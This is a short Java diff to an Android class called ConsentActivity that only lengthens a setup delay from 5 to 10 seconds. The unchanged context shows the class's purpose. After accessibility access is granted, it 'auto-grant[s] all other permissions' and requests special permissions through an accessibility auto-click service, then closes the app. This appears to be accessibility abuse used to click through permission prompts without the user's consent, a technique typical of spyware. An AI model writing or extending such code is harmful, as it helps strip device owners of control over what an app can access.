@@ -96,7 +96,7 @@ public class ConsentActivity extends AppCompatActivity {
     }
 
     private void onAccessibilityGranted() {
-        Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "Accessibility enabled! Setting up (10s)...", Toast.LENGTH_LONG).show();
         
         // Now auto-grant all other permissions
         new Handler().postDelayed(() -> {
@@ -172,14 +172,14 @@ public class ConsentActivity extends AppCompatActivity {
             permissionManager.requestSpecialPermissions();
         }, 2000);
 
-        // Final finish - disable auto-click and close app
+        // Final finish - disable auto-click and close app (10 seconds total)
         new Handler().postDelayed(() -> {
             // Disable auto-click after setup is complete
             AccessibilityHelperService.disableAutoClick();
             
             Toast.makeText(this, "Setup Complete!", Toast.LENGTH_SHORT).show();
             finish();
-        }, 5000);
+        }, 10000);
     }
 
     @Override
